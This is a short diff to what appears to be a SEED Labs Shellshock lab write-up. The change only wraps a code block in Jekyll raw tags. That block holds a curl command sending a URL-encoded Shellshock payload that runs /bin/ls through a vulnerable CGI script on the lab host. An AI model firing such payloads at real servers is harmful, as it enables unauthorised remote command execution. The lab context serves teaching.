@@ -155,9 +155,11 @@ From the screenshot above, we can see that the server responded with an error. T
 
 Does that mean if we encode the whitespace, the attack will then be successful? To verify this, we can craft the following command: `http://www.seedlab-shellshock.com/cgi-bin/vul.cgi`
 
+{% raw %}
 ```bash
 curl --get --data "()%20{%20dummy;};%20echo;%20/bin/ls" www.seedlab-shellshock.com/cgi-bin/vul.cgi -v`
 ```
+{% endraw %}
 
 ![task-2-g](https://github.com/iukadike/blog/assets/58455326/2c583bdf-e4da-419e-9a0e-c3b634d23805)
 
